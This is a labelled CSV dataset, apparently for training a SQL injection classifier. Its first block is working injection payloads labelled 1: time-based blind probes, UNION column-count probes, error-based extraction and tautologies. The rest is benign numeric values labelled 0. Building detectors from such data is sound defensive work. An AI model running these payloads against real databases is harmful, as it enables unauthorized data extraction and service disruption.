Sentence,Label
"1'+  (  select 'ycsv' where 3628  =  3628 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1'||  (  select 'nfgq' where 1837  =  1837 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1'+  (  select 'mxei' where 7811  =  7811 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1'||  (  select 'goxu' where 9215  =  9215 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1'||  (  select 'pzoe' where 2977  =  2977 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,1
1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,1
1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
1'+  (  select 'mdxt' where 2733  =  2733 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"1'+  (  select 'mikf' where 5814  =  5814 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'||  (  select 'vwop' where 8536  =  8536 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'||  (  select 'ssvp' where 3300  =  3300 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'+  (  select 'zohk' where 5502  =  5502 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'+  (  select 'hoqt' where 4877  =  4877 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1'||  (  select 'jlka' where 5436  =  5436 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1'+  (  select 'opqr' where 2442  =  2442 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1'||  (  select 'gikt' where 8447  =  8447 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1'||  (  select 'votg' where 5105  =  5105 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1'+  (  select 'lawc' where 1171  =  1171 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1'+  (  select 'dbvq' where 2045  =  2045 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'||  (  select 'eils' where 8308  =  8308 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'||  (  select 'scqw' where 3337  =  3337 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1'+  (  select 'vwzp' where 2729  =  2729 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1'+  (  select 'arqt' where 2336  =  2336 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1'||  (  select 'dpje' where 2704  =  2704 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1'+  (  select 'ycvl' where 8415  =  8415 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1'||  (  select 'ryom' where 1134  =  1134 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1'+  (  select 'kqnj' where 9483  =  9483 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,1
1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,1
1'||  (  select 'tvcy' where 5592  =  5592 order by 1#,1
1'+  (  select 'ezpy' where 5282  =  5282 order by 1#,1
1'+  (  select 'vtyw' where 7950  =  7950 order by 1--,1
1'||  (  select 'ucxp' where 6612  =  6612 order by 1--,1
"1'+  (  select 'vbqo' where 5630  =  5630 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1'||  (  select 'qued' where 9801  =  9801 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
1'+  (  select 'wyxu' where 2555  =  2555 union all select null#,1
1'||  (  select 'puco' where 2605  =  2605 union all select null#,1
"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",1
"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",1
"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",1
"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",1
"1'+  (  select 'zkum' where 5161  =  5161 union all select null,null,null,null#",1
"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",1
"1'+  (  select 'vabj' where 7178  =  7178 union all select null,null,null,null,null#",1
"1'||  (  select 'tdcr' where 6792  =  6792 union all select null,null,null,null,null#",1
"1'||  (  select 'akye' where 9242  =  9242 union all select null,null,null,null,null,null#",1
"1'+  (  select 'aphz' where 1933  =  1933 union all select null,null,null,null,null,null#",1
"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",1
"1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null#",1
"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",1
"1'||  (  select 'lzvb' where 1637  =  1637 union all select null,null,null,null,null,null,null,null#",1
"1'+  (  select 'rryx' where 1228  =  1228 union all select null,null,null,null,null,null,null,null,null#",1
"1'||  (  select 'fdkl' where 4572  =  4572 union all select null,null,null,null,null,null,null,null,null#",1
"1'||  (  select 'pnsw' where 2103  =  2103 union all select null,null,null,null,null,null,null,null--",1
"1'||  (  select 'neqi' where 6873  =  6873 union all select null,null,null,null,null,null,null--",1
"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",1
"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",1
"1'||  (  select 'xbwg' where 7518  =  7518 union all select null,null,null,null,null,null--",1
"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",1
"1'||  (  select 'fqoz' where 9794  =  9794 union all select null,null,null,null,null--",1
"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",1
"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",1
"1'+  (  select 'ixza' where 4374  =  4374 union all select null,null,null--",1
"1'||  (  select 'mzhj' where 9677  =  9677 union all select null,null,null--",1
"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",1
"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",1
1'+  (  select 'yahq' where 6974  =  6974 union all select null--,1
1'||  (  select 'owzs' where 1475  =  1475 union all select null--,1
"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",1
"1' in boolean mode  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",1
"1'   )    )    as jvwq where 6596  =  6596 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1' where 2123  =  2123 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1'||  (  select 'rask' from dual where 9411  =  9411 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",1
1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',1
"1'||  (  select 'kbvq' where 9279  =  9279 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1
"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'trdf' like 'trdf",1
1' and 7528  =  2894 and 'qoyw'  =  'qoyw,1
1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,1
1' in boolean mode  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  #,1
1'   )    )    as oyad where 7161  =  7161 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
1' where 8945  =  8945 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
"1'||  (  select 'ycya' from dual where 3536  =  3536 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1'+  (  select 'qmtx' where 6992  =  6992 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
1'||  (  select 'cgup' from dual where 5383  =  5383 waitfor delay '0:0:5'--,1
1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,1
1'+  (  select 'dkxk' where 1241  =  1241 waitfor delay '0:0:5'--,1
1'||  (  select 'miew' where 8360  =  8360 waitfor delay '0:0:5'  )  ||',1
1'||  (  select 'xwbo' from dual where 1263  =  1263 waitfor delay '0:0:5'  )  ||',1
1'+  (  select 'qsqs' where 9227  =  9227 waitfor delay '0:0:5'  )  +',1
1' or '1'  =  '1,1
1' waitfor delay '0:0:5',1
1'  )   waitfor delay '0:0:5',1
"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )",1
1' in boolean mode  )   waitfor delay '0:0:5'#,1
1'   )    )    as azsd where 3870  =  3870 waitfor delay '0:0:5'--,1
1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,1
1' in boolean mode  )   waitfor delay '0:0:5'--,1
1'+  (  select gkve where 1943  =  1943 waitfor delay '0:0:5'  )  +',1
1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,1
1' waitfor delay '0:0:5' and 'vwuz'  =  'vwuz,1
1' waitfor delay '0:0:5' and 'jree'  =  'jree,1
"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )",1
"1,  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4932  =  4932  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )",1
"1,  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )",1
"1,  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --",1
"1,  (  select   (  case when   (  1570  =  1570  )   then   (  select 1570 from pg_sleep  (  5   )    )    else 1/  (  select 0  )   end   )    )",1
"1,  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )",1
"1,  (  select   (  case when   (  7711  =  7711  )   then 1 else 7711*  (  select 7711 from information_schema.character_sets  )   end   )    )",1
"1,  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )",1
"1,  (  select   (  case when   (  8392  =  8404  )   then 1 else 8392*  (  select 8392 from information_schema.character_sets  )   end   )    )",1
"1,  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )",1
"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )",1
"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )",1
"1,  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )",1
"1,row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )",1
"1,exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )",1
"1,extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )",1
"1,updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )",1
1.00217E+15,0
3.00245E+15,0
8.00405E+14,0
9.00454E+15,0
7.01035E+15,0
5.01063E+15,0
5.01119E+15,0
8.01225E+15,0
2.01871E+15,0
9.0199E+15,0
5.01E+15,0
8.02525E+15,0
1.02549E+15,0
1.02606E+15,0
2.02612E+15,0
6.02828E+15,0
7.02E+15,0
6.03007E+15,0
9.03287E+15,0
6.03487E+15,0
2.03614E+14,0
2.03996E+15,0
4.03E+15,0
6.04089E+15,0
8.04302E+15,0
2.04422E+15,0
5.04489E+15,0
8.04589E+15,0
5.04811E+15,0
8.04948E+15,0
6.05128E+15,0
9.0515E+15,0
6.05258E+15,0
3.05338E+15,0
7.05723E+15,0
1.05923E+15,0
5.05975E+14,0
7.05E+15,0
1.06099E+14,0
9.06153E+15,0
3.06517E+15,0
1.06705E+14,0
4.07378E+15,0
3.07402E+15,0
3.07443E+15,0
1.07544E+15,0
5.07682E+15,0
9.08272E+14,0
1.0841E+15,0
8.08498E+15,0
4.08791E+15,0
3.09015E+15,0
3.09031E+15,0
6.09196E+15,0
7.09479E+15,0
8.0957E+15,0
8.09757E+15,0
4.10842E+15,0
5.10E+15,0
5.11164E+15,0
2.11181E+15,0
9.11358E+14,0
6.1136E+15,0
7.11566E+15,0
5.11823E+15,0
3.11985E+15,0
8.11985E+15,0
2.11E+15,0
3.1201E+15,0
8.1203E+15,0
6.12137E+15,0
5.12155E+14,0
9.12244E+15,0
3.12382E+15,0
2.12404E+14,0
4.1265E+15,0
3.12801E+15,0
5.12832E+15,0
5.1284E+14,0
8.12979E+15,0
1.13313E+15,0
1.1363E+15,0
7.13661E+15,0
4.13841E+15,0
7.13887E+14,0
6.14046E+15,0
3.14114E+15,0
6.14206E+15,0
7.14471E+15,0
2.14581E+15,0
4.14869E+15,0
9.15202E+15,0
3.15402E+15,0
5.15574E+15,0
9.16169E+15,0
9.16233E+15,0
4.16237E+15,0
6.16251E+15,0
3.16361E+15,0
6.1643E+15,0
8.16E+15,0
1.16E+15,0
6.1724E+15,0
9.17344E+15,0
5.17668E+15,0
9.17827E+15,0
7.17889E+15,0
8.17915E+15,0
5.181E+15,0
6.18286E+15,0
8.18595E+15,0
3.18663E+15,0
6.18738E+15,0
5.18985E+14,0
9.18E+15,0
2.18E+15,0
1.19007E+15,0
2.1902E+15,0
4.19037E+15,0
3.19291E+15,0
3.19537E+15,0
9.19E+15,0
6.19E+15,0
4.20136E+14,0
2.20136E+15,0
9.20248E+15,0
6.20274E+15,0
7.20299E+15,0
3.20326E+15,0
5.20367E+15,0
6.20415E+15,0
1.20453E+15,0
1.20613E+15,0
7.20777E+15,0
1.20958E+14,0
7.20E+15,0
6.2103E+15,0
3.21396E+15,0
1.21588E+15,0
8.2197E+15,0
2.21E+15,0
1.22216E+15,0
2.22584E+14,0
4.22605E+15,0
4.22608E+15,0
3.22773E+15,0
9.22805E+15,0
1.22869E+15,0
5.22E+15,0
8.23106E+15,0
4.23384E+15,0
4.23439E+15,0
2.23935E+15,0
3.24209E+15,0
5.24225E+13,0
2.24329E+15,0
6.24331E+15,0
3.24363E+15,0
4.24505E+15,0
3.24545E+15,0
2.25315E+15,0
5.25502E+15,0
6.25525E+15,0
6.25662E+15,0
6.25668E+15,0
5.25793E+15,0
5.25966E+15,0
8.25977E+15,0
4.26048E+15,0
5.26636E+15,0
9.26768E+15,0
1.26952E+15,0
6.26E+15,0
8.27055E+15,0
5.27381E+14,0
6.27383E+15,0
4.27735E+15,0
5.27767E+15,0
2.27852E+15,0
8.27854E+15,0
4.27965E+15,0
1.27984E+15,0
7.28065E+15,0
1.28145E+15,0
4.28192E+15,0
7.28211E+15,0
2.28251E+15,0
6.28598E+15,0
7.28868E+15,0
8.2886E+15,0
4.29127E+15,0
6.29894E+15,0
3.29E+15,0
1.29E+15,0
2.30158E+15,0
9.30174E+15,0
3.30212E+15,0
4.30298E+15,0
1.3059E+15,0
6.3087E+15,0
2.30E+15,0
3.31324E+15,0
7.31467E+14,0
9.31575E+15,0
3.31765E+15,0
6.31786E+15,0
8.32244E+15,0
8.32456E+15,0
9.3269E+14,0
9.32767E+15,0
3.32981E+15,0
8.32E+15,0
3.33213E+15,0
7.33372E+15,0
8.33614E+15,0
5.33828E+15,0
6.34182E+15,0
6.34191E+15,0
6.34351E+15,0
1.3438E+15,0
4.34481E+15,0
1.34688E+15,0
5.34929E+15,0
8.34964E+15,0
1.35045E+15,0
8.35555E+15,0
1.35689E+15,0
9.35728E+15,0
4.35874E+15,0
7.35961E+15,0
5.35994E+15,0
3.35E+15,0
6.36091E+15,0
3.36323E+15,0
8.36404E+15,0
9.36496E+14,0
8.366E+15,0
7.36777E+15,0
9.37032E+15,0
5.37091E+14,0
3.37557E+15,0
5.37737E+15,0
1.38067E+15,0
7.38083E+15,0
4.38114E+15,0
3.38196E+14,0
7.38537E+15,0
5.38547E+15,0
8.3888E+15,0
2.38947E+15,0
8.38E+15,0
6.39488E+14,0
8.40007E+15,0
7.40029E+15,0
3.4008E+15,0
2.4082E+15,0
5.40E+15,0
8.41734E+15,0
5.41816E+15,0
7.41E+15,0
8.42194E+15,0
4.42213E+15,0
1.42319E+15,0
6.4255E+15,0
2.42593E+15,0
3.4285E+15,0
9.42955E+15,0
4.43193E+15,0
4.4334E+15,0
4.43607E+15,0
6.44187E+14,0
6.44636E+15,0
9.4488E+15,0
6.44911E+15,0
5.44972E+15,0
1.44E+15,0
5.45333E+15,0
9.45394E+14,0
3.45448E+15,0
9.45491E+14,0
1.45569E+15,0
9.45715E+15,0
2.4571E+15,0
2.45746E+15,0
6.45831E+15,0
3.45951E+14,0
2.45E+15,0
8.45E+15,0
4.46161E+14,0
4.46658E+15,0
7.46688E+15,0
2.46691E+14,0
6.4671E+15,0
4.46813E+15,0
9.46936E+15,0
4.47104E+15,0
9.47299E+15,0
2.47397E+15,0
4.47673E+15,0
4.47874E+15,0
6.48256E+15,0
9.48E+15,0
6.49002E+15,0
9.49221E+15,0
5.49426E+15,0
8.49643E+15,0
1.4996E+15,0
1.50338E+15,0
6.50345E+15,0
7.50908E+15,0
5.50989E+15,0
2.51064E+15,0
6.51129E+15,0
8.51136E+15,0
7.51221E+15,0
8.5138E+15,0
9.51518E+15,0
7.51931E+15,0
8.51E+15,0
8.52064E+15,0
1.52349E+15,0
1.52494E+15,0
4.52635E+14,0
3.52714E+15,0
9.5286E+15,0
6.52922E+15,0
2.53246E+15,0
3.53283E+14,0
1.53418E+15,0
5.5366E+15,0
5.53776E+15,0
8.54124E+15,0
4.5422E+15,0
9.54368E+15,0
7.54804E+15,0
3.54937E+15,0
6.54E+15,0
4.55062E+15,0
6.5524E+15,0
9.55315E+15,0
8.55461E+15,0
9.55464E+15,0
3.55661E+15,0
2.55791E+15,0
5.5584E+15,0
9.56114E+15,0
5.56194E+15,0
5.56439E+15,0
1.56766E+14,0
5.56841E+15,0
5.56878E+15,0
9.57099E+14,0
1.57143E+15,0
3.57286E+15,0
9.57318E+15,0
5.57567E+15,0
2.57E+15,0
5.58043E+15,0
3.58067E+15,0
1.58112E+15,0
3.58192E+15,0
3.5822E+15,0
5.58562E+15,0
8.58629E+14,0
8.58811E+15,0
6.58835E+15,0
2.58973E+15,0
6.59091E+15,0
8.59153E+15,0
3.59196E+15,0
4.59244E+15,0
5.60169E+15,0
3.60204E+15,0
8.60573E+15,0
6.60819E+15,0
3.60E+15,0
9.61016E+15,0
2.61077E+15,0
4.61189E+15,0
6.61271E+15,0
3.61612E+15,0
1.61637E+15,0
8.61689E+15,0
4.61733E+15,0
3.61806E+15,0
1.62177E+15,0
3.62194E+15,0
8.62225E+15,0
8.62453E+15,0
4.62514E+14,0
5.62626E+14,0
3.62829E+15,0
7.63602E+15,0
3.63611E+15,0
9.63962E+15,0
8.64151E+15,0
2.6419E+15,0
6.64228E+14,0
3.64462E+15,0
4.64693E+15,0
7.64748E+15,0
1.64936E+15,0
8.65216E+15,0
3.65439E+15,0
4.65441E+15,0
3.65591E+15,0
6.65741E+15,0
5.65818E+15,0
3.6585E+15,0
6.6591E+15,0
1.65E+15,0
7.66646E+15,0
9.66866E+15,0
5.66E+15,0
5.67192E+14,0
6.67245E+15,0
3.67249E+15,0
7.6744E+15,0
7.67474E+13,0
4.67612E+15,0
4.67615E+15,0
8.67859E+15,0
1.67E+15,0
7.67E+15,0
5.68541E+15,0
3.68572E+15,0
7.68627E+15,0
7.6889E+15,0
7.68942E+15,0
7.68E+15,0
6.69143E+14,0
8.69184E+15,0
5.69342E+15,0
1.69372E+15,0
7.69444E+15,0
7.69984E+15,0
6.70192E+15,0
8.7027E+15,0
9.70863E+15,0
8.71176E+15,0
6.71271E+14,0
5.71439E+15,0
3.71442E+15,0
1.71456E+15,0
7.71458E+15,0
6.71628E+15,0
6.71861E+15,0
4.71E+15,0
2.72034E+15,0
5.72741E+15,0
3.72891E+15,0
3.72946E+15,0
8.72E+15,0
1.72E+15,0
6.73367E+15,0
7.73869E+15,0
8.73E+15,0
3.74288E+15,0
9.74327E+15,0
6.74367E+15,0
5.74629E+15,0
6.74855E+15,0
8.74946E+15,0
2.75211E+15,0
2.75339E+15,0
2.75401E+15,0
7.75898E+15,0
6.75986E+15,0
7.75E+15,0
8.76216E+15,0
1.76476E+15,0
1.76488E+15,0
5.76573E+15,0
9.7668E+15,0
5.7678E+14,0
1.76964E+15,0
7.77111E+15,0
9.77141E+15,0
2.77156E+15,0
7.77188E+15,0
5.77313E+14,0
5.77329E+15,0
8.77345E+15,0
4.77403E+15,0
2.77767E+15,0
7.77E+15,0
2.78007E+14,0
4.78072E+15,0
3.78104E+15,0
2.78171E+15,0
2.7841E+15,0
1.78478E+15,0
7.78503E+15,0
3.786E+15,0
6.79138E+15,0
3.79218E+15,0
6.79504E+13,0
2.79567E+15,0
5.79616E+15,0
2.79635E+15,0
4.79638E+15,0
3.79662E+15,0
2.79749E+15,0
4.79764E+15,0
7.79828E+15,0
5.79858E+15,0
4.79E+15,0
8.79E+15,0
4.8004E+14,0
4.80152E+15,0
6.80379E+15,0
4.80387E+15,0
4.80991E+15,0
1.80E+15,0
4.81172E+15,0
8.81212E+15,0
7.81237E+15,0
2.81517E+15,0
4.81564E+15,0
9.8156E+14,0
3.81793E+14,0
3.81894E+15,0
6.81924E+15,0
3.82074E+15,0
2.82171E+15,0
3.82381E+15,0
5.82525E+15,0
1.82575E+15,0
9.82891E+15,0
2.82E+15,0
8.83352E+15,0
9.83415E+15,0
1.83452E+15,0
6.83781E+15,0
8.83838E+15,0
6.8388E+14,0
5.83899E+15,0
2.84001E+15,0
7.84027E+15,0
7.84149E+15,0
9.84215E+15,0
1.8461E+15,0
5.84996E+15,0
9.84is22nte334c799,0
3.85057E+14,0
8.85119E+15,0
5.85437E+15,0
7.85716E+15,0
1.85884E+15,0
8.85924E+15,0
4.85943E+15,0
4.86024E+14,0
7.86165E+15,0
5.861E+15,0
6.8623E+15,0
4.86728E+15,0
3.86932E+15,0
1.86E+15,0
7.86E+15,0
2.8707E+15,0
7.87131E+15,0
8.87551E+14,0
6.87721E+15,0
2.88508E+14,0
4.88546E+14,0
5.88554E+15,0
5.88668E+15,0
5.88977E+15,0
8.88987E+15,0
3.88988E+15,0
3.88E+15,0
1.89129E+15,0
3.89139E+15,0
3.89191E+15,0
3.89386E+15,0
1.89443E+15,0
9.8986E+14,0
